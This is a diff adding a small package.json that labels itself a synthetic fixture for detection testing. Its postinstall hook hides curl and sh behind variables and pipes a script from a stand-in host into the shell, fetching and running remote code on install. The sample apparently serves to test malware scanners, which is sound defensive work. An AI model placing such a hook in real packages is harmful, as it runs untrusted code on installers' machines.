@@ -1,0 +1,8 @@
+{
+  "name": "fixture-postinstall-tools-named-by-variables",
+  "version": "1.0.0",
+  "description": "FIXTURE ONLY — synthetic detection test sample, not real malware",
+  "scripts": {
+    "postinstall": "c=curl; s=sh; $c -s https://stage.example.invalid/i.sh | $s"
+  }
+}
